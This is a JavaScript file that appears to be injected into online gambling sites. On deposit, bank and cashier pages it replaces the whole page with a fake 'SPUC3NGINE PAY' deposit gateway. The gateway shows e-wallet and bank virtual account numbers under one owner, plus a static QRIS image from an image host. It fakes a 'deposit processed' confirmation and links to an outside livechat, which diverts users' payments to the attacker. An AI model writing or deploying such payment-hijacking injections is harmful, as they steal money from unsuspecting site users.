(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php',
    '/index.php?page=deposit',
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SPUC3NGINE PAY - ProMax Edition</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --bg-main: #020208;
        --bg-card: rgba(6, 10, 26, 0.7);
        --primary: #00f0ff;
        --secondary: #ff007f;
        --success: #00ffcc;
        --border: rgba(0, 240, 255, 0.3);
        --neon-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
      }

      body {
        margin: 0;
        font-family: 'Rajdhani', sans-serif;
        background-color: var(--bg-main);
        background-image: 
          linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
          linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
        background-size: 20px 20px;
        background-position: center;
        color: #f1f5f9;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px 0;
        box-sizing: border-box;
        overflow-x: hidden;
        animation: bgScroll 20s linear infinite;
      }

      @keyframes bgScroll {
        from { background-position: 0 0; }
        to { background-position: 40px 40px; }
      }

      .container {
        max-width: 460px;
        width: 92%;
        background: var(--bg-card);
        backdrop-filter: blur(25px);
        -webkit-backdrop-filter: blur(25px);
        border-radius: 32px;
        border: 2px solid var(--border);
        box-shadow: 0 0 60px rgba(0, 240, 255, 0.15), inset 0 0 35px rgba(255, 0, 127, 0.15);
        padding: 40px 30px;
        display: flex;
        flex-direction: column;
        align-items: center;
        position: relative;
        box-sizing: border-box;
        animation: promaxEntrance 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
      }

      @keyframes promaxEntrance {
        0% { opacity: 0; transform: scale(0.8) rotate(-2deg); filter: blur(10px); }
        100% { opacity: 1; transform: scale(1) rotate(0deg); filter: blur(0); }
      }

      .container::before {
        content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px;
        background: linear-gradient(45deg, var(--primary), transparent, var(--secondary), transparent);
        border-radius: 32px; z-index: -1; opacity: 0.4; pointer-events: none;
      }

      .logo-area {
        font-family: 'Orbitron', sans-serif;
        font-size: 32px;
        font-weight: 900;
        text-align: center;
        letter-spacing: 4px;
        background: linear-gradient(90deg, var(--primary), #fff, var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 2px;
        filter: drop-shadow(0 0 15px rgba(0, 240, 255, 0.6));
        animation: logoGlitch 4s infinite alternate;
      }

      @keyframes logoGlitch {
        0%, 100% { transform: skew(0deg); filter: drop-shadow(0 0 15px rgba(0, 240, 255, 0.6)); }
        4% { transform: skew(-5deg); filter: drop-shadow(2px 0 var(--secondary)); }
        7% { transform: skew(5deg); }
        10% { transform: skew(0deg); }
      }

      .subtitle {
        font-size: 13px;
        color: #94a3b8;
        letter-spacing: 8px;
        text-transform: uppercase;
        margin-bottom: 28px;
        font-weight: 700;
        opacity: 0.8;
      }

      .marquee {
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
        background: rgba(251, 191, 36, 0.03);
        border: 1px solid rgba(251, 191, 36, 0.25);
        border-radius: 12px;
        padding: 12px;
        color: #fbbf24;
        margin-bottom: 28px;
        font-size: 13px;
        box-sizing: border-box;
        font-weight: 600;
        box-shadow: inset 0 0 10px rgba(251, 191, 36, 0.05);
      }

      .marquee span {
        display: inline-block;
        padding-left: 100%;
        animation: marquee 20s linear infinite;
      }

      @keyframes marquee {
        0% { transform: translateX(0%); }
        100% { transform: translateX(-100%); }
      }

      .actions {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 14px;
        width: 100%;
        margin-bottom: 28px;
      }

      button {
        width: 100%;
        background: linear-gradient(135deg, #00b4d8, var(--primary));
        color: #020208;
        border: none;
        padding: 15px 20px;
        border-radius: 16px;
        font-family: 'Rajdhani', sans-serif;
        font-size: 16px;
        font-weight: 700;
        text-transform: uppercase;
        cursor: pointer;
        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        box-shadow: var(--neon-shadow);
        letter-spacing: 1px;
        position: relative;
        overflow: hidden;
      }

      button::after {
        content: ''; position: absolute; top: 0; left: -50%; width: 200%; height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
        transform: skewX(-20deg); transition: 0.75s; opacity: 0;
      }

      button:hover::after { left: 120%; opacity: 1; }

      button:hover {
        transform: translateY(-4px) scale(1.02);
        box-shadow: 0 0 30px rgba(0, 240, 255, 0.8);
      }

      button.secondary {
        background: linear-gradient(135deg, var(--secondary), #b50056);
        color: #fff;
        box-shadow: 0 0 20px rgba(255, 0, 127, 0.4);
      }
      button.secondary:hover {
        box-shadow: 0 0 35px rgba(255, 0, 127, 0.8);
      }

      button.help {
        grid-column: span 2;
        background: rgba(255, 255, 255, 0.02) !important;
        border: 1px dashed rgba(0, 240, 255, 0.3) !important;
        color: var(--primary) !important;
        box-shadow: none !important;
        margin-top: 4px;
      }
      button.help:hover {
        background: rgba(0, 240, 255, 0.08) !important;
        border-style: solid !important;
        box-shadow: var(--neon-shadow) !important;
      }

      select, input {
        width: 100%;
        padding: 15px 20px;
        border: 1px solid var(--border);
        border-radius: 16px;
        font-size: 16px;
        background: #040714;
        color: #fff;
        font-family: 'Rajdhani', sans-serif;
        font-weight: 600;
        box-sizing: border-box;
        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        margin-bottom: 16px;
      }

      select:focus, input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
        background: #080d26;
      }

      .content-panel {
        width: 100%;
        animation: promaxPanelIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
      }

      @keyframes promaxPanelIn {
        from { opacity: 0; transform: scale(0.96) translateY(20px); filter: blur(4px); }
        to { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
      }

      .bank-info {
        background: rgba(4, 7, 20, 0.8);
        padding: 22px;
        border-radius: 20px;
        border: 1px solid rgba(255, 0, 127, 0.25);
        display: flex;
        flex-direction: column;
        gap: 16px;
        margin-bottom: 16px;
        box-shadow: inset 0 0 15px rgba(255,0,127,0.05);
      }

      .bank-header {
        display: flex;
        align-items: center;
        gap: 16px;
      }

      .bank-info img {
        width: 50px;
        height: 50px;
        object-fit: contain;
        background: #fff;
        padding: 6px;
        border-radius: 12px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.4);
      }

      .bank-meta b { font-size: 22px; color: var(--primary); font-family: 'Orbitron', sans-serif; }
      .bank-meta small { color: #64748b; font-size: 14px; display: block; margin-top: 3px; font-weight: 700; text-transform: uppercase; }

      .bank-number {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: #010206;
        padding: 14px 18px;
        border-radius: 14px;
        border: 1px solid rgba(255,255,255,0.03);
      }

      .bank-number span {
        font-family: 'Orbitron', sans-serif;
        font-size: 17px;
        letter-spacing: 1.5px;
        color: #fff;
        text-shadow: 0 0 8px rgba(255,255,255,0.3);
      }

      .copy-btn {
        width: auto;
        padding: 8px 18px;
        font-size: 13px;
        border-radius: 10px;
        box-shadow: none;
      }

      .result-area { text-align: center; margin-top: 20px; }

      .qr-card {
        background: #fff;
        padding: 18px;
        border-radius: 24px;
        display: inline-block;
        box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 25px rgba(0, 240, 255, 0.3);
        animation: qrPulse 2s infinite ease-in-out;
      }
      
      @keyframes qrPulse {
        0%, 100% { box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 25px rgba(0, 240, 255, 0.3); }
        50% { box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 40px rgba(255, 0, 127, 0.5); }
      }
      .qr-card img { width: 220px; height: 220px; display: block; border-radius: 8px; }

      .qr-buttons { display: flex; gap: 14px; margin-top: 20px; width: 100%; }
      
      .done-btn {
        background: linear-gradient(135deg, var(--success), #00ba9b);
        color: #020208;
        box-shadow: 0 4px 15px rgba(0, 255, 204, 0.3);
      }
      .done-btn:hover { box-shadow: 0 0 25px rgba(0, 255, 204, 0.6); }

      .spinner {
        width: 48px;
        height: 48px;
        border: 4px solid rgba(0, 240, 255, 0.05);
        border-top: 4px solid var(--primary);
        border-right: 4px solid var(--secondary);
        border-radius: 50%;
        animation: spin 0.6s linear infinite;
        margin: 30px auto;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      .footer-img {
        margin-top: 32px;
        text-align: center;
        opacity: 0.25;
        transition: opacity 0.4s, filter 0.4s;
        filter: grayscale(100%) brightness(150%);
      }
      .footer-img:hover { opacity: 0.7; filter: grayscale(0%) brightness(100%); }
      .footer-img img { max-width: 50%; }

      .toast {
        position: fixed;
        bottom: 40px;
        left: 50%;
        transform: translateX(-50%) scale(0.8);
        min-width: 280px;
        text-align: center;
        padding: 15px 25px;
        border-radius: 16px;
        font-size: 15px;
        font-weight: 700;
        opacity: 0;
        pointer-events: none;
        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        z-index: 9999;
        font-family: 'Rajdhani', sans-serif;
        text-transform: uppercase;
        letter-spacing: 1px;
      }
      .toast.show { opacity: 1; transform: translateX(-50%) scale(1); }
      .toast.success { background: var(--success); color: #020208; box-shadow: 0 0 25px rgba(0,255,204,0.5); }
      .toast.error { background: var(--secondary); color: #fff; box-shadow: 0 0 25px rgba(255,0,127,0.5); }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <div class="logo-area">SPUC3NGINE PAY</div>
      <div class="subtitle">OTOMATIS GATEWAY</div>
      
      <div class="marquee">
        <span>⚠️ Deposit WAJIB sesuai nominal formulir! Transaksi pertama DIWAJIBKAN menggunakan Kode Unik (Contoh: 50.778). Jika melanggar syarat ketentuan, otomatis GAGAL PROSES.</span>
      </div>

      <div class="actions">
        <button onclick="showDeposit('manual')">Manual Deposit</button>
        <button class="secondary" onclick="showDeposit('auto')">Instant QRIS</button>
        <button class="help" onclick="openHelp()">💬 Hubungi Bantuan Deposit</button>
      </div>

      <div id="manual-step" class="content-panel" style="display:none;">
        <select onchange="selectMethod(this.value)">
          <option value="" selected disabled>-- PILIH METODE DEPOSIT --</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"085179820753","owner":"PUR**A ISM**L"}'>Dana</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"SCAN QRIS","owner":"SCAN QRIS"}'>Ovo</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"8881085179820753","owner":"PUR**A ISM**L"}'>BRI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"3935085179820753","owner":"PUR**A ISM**L"}'>BCA VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810085179820753","owner":"PUR**A ISM**L"}'>BNI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001085179820753","owner":"PUR**A ISM**L"}'>MANDIRI VA</option>
        </select>
        
        <div id="manual-details" class="bank-info" style="display:none">
          <div class="bank-header">
            <img id="bank-logo" src="" alt="Bank Logo">
            <div class="bank-meta">
              <b id="bank-name"></b>
              <small id="bank-owner"></small>
            </div>
          </div>
          <div class="bank-number">
            <span id="bank-number"></span>
            <button class="copy-btn" onclick="copyNumber()">Salin</button>
          </div>
          <input id="manual-nominal" type="text" placeholder="Nominal (Min. 50.000)" oninput="formatRupiahEvent(this)">
          <button onclick="submitManualDeposit()">Kirim Konfirmasi</button>
          <div id="manual-result"></div>
        </div>
      </div>

      <div id="auto-deposit" class="content-panel" style="display:none;">
        <input id="nominal" type="text" placeholder="Nominal (Min. 50.000)" oninput="formatRupiahEvent(this)">
        <button class="secondary" onclick="generateQRIS()">Buat QRIS Sekarang</button>
        <div id="auto-result" class="result-area"></div>
      </div>

      <div class="footer-img">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment Gate">
      </div>
    </div>
    <div id="toast" class="toast"></div>
  `;

  window.formatRupiahEvent = function (element) {
    let value = element.value.replace(/[^0-9]/g, "");
    if (value === "") {
      element.value = "";
      return;
    }
    element.value = Number(value).toLocaleString("id-ID");
  };

  function getCleanNumber(str) {
    return Number(str.replace(/\./g, "") || 0);
  }

  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove("show"), 2500);
  }

  window.showDeposit = function (type) {
    const manualPanel = document.getElementById("manual-step");
    const autoPanel = document.getElementById("auto-deposit");
    
    manualPanel.style.display = type === "manual" ? "block" : "none";
    autoPanel.style.display = type === "auto" ? "block" : "none";
  };

  window.selectMethod = function (j) {
    if (!j) return;
    const m = JSON.parse(j);
    const details = document.getElementById("manual-details");
    details.style.display = "flex";
    document.getElementById("bank-logo").src = m.logo;
    document.getElementById("bank-name").innerText = m.name;
    document.getElementById("bank-number").innerText = m.number;
    document.getElementById("bank-owner").innerText = "A/N: " + m.owner;
  };

  window.copyNumber = function () {
    const num = document.getElementById("bank-number").innerText;
    if (!num) return showToast("Nomor kosong!", "error");
    navigator.clipboard.writeText(num).then(() => showToast("⚡ Rekening Berhasil Disalin", "success"));
  };

  window.submitManualDeposit = function () {
    const rawVal = document.getElementById("manual-nominal").value;
    const n = getCleanNumber(rawVal);
    
    if (n < 50000) return showToast("Minimal deposit Rp 50.000", "error");
    document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {
      document.getElementById("manual-result").innerHTML = "<div style='color:var(--success); font-weight:700; margin-top:14px; font-size:18px; letter-spacing:0.5px;'>✓ SYSTEM: DEPOSIT DIPROSES</div>";
      setTimeout(() => history.back(), 1500);
    }, 1500);
  };

  window.generateQRIS = function () {
    const rawVal = document.getElementById("nominal").value;
    const n = getCleanNumber(rawVal);
    
    if (n < 50000) return showToast("Minimal Rp 50.000", "error");
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';

    const qrUrl = "https://s13.gifyu.com/images/bdkMV.jpg";

    setTimeout(() => {
      document.getElementById("auto-result").innerHTML = `
        <div class="qr-card" style="animation: promaxPanelIn 0.5s ease;">
          <img id="qris-img" src="${qrUrl}" alt="QRIS">
        </div>
        <div class="qr-buttons">
          <button style="background:#3b82f6; color:#fff; box-shadow:0 0 15px rgba(59,130,246,0.4)" onclick="downloadQRIS()">Unduh QRIS</button>
          <button class="done-btn" onclick="history.back()">Sudah Membayar</button>
        </div>
      `;
    }, 1200);
  };

  window.downloadQRIS = function () {
    const qrUrl = "https://s13.gifyu.com/images/bdkMV.jpg";
    const link = document.createElement("a");
    link.href = qrUrl;
    link.download = "spuc3ngine-qris.png";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("✓ QRIS Berhasil Diunduh", "success");
  };

  window.openHelp = function () {
    window.open("https://direct.lc.chat/19752556/", "_blank");
  };
})();
